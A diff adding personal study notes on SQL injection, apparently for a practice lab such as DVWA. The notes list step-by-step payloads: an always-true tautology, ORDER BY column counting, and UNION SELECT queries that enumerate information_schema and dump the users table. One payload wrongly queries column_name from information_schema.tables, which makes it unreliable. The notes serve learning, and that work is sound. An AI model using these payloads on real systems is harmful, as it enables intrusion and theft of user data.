@@ -61,3 +61,48 @@ Similar to alway true
 ## sql injection in general
 > [Examining the database in SQL injection attacks](https://portswigger.net/web-security/sql-injection/examining-the-database)
 
+
+
+# Easy inject
+
+## Check if always true injection works
+
+    ' OR ''='
+
+> This will return all the First_name and surname
+
+## Check number of columns return
+
+    ' order by (n)#
+
+> Keep increasing n until the returns unknown column
+
+## Get the table name info using information_schema
+
+    ' union select null, schema_name from information_schema.schemata#
+
+> This will return all the information schema schemas
+> 
+> among the list, there is a table schema that we can take a look at
+
+    ' union select null, table_name from information_schema.tables#
+
+> This will return all the tables inside the database
+> >
+> One that can be seen is users,
+> >
+> If you cannot determine which one si the right table, check them all out
+
+## Using table name to find the columns
+
+    ' union select null, column_name from information_schema.tables where table_name='users'#
+
+> This will return all the columsn from the current table name of "users"
+
+## Get info
+
+    ' union select null, (any column) from users #
+
+> This will allow us to get any information from the table.
+> >
+> This method will also work when doing blind injection
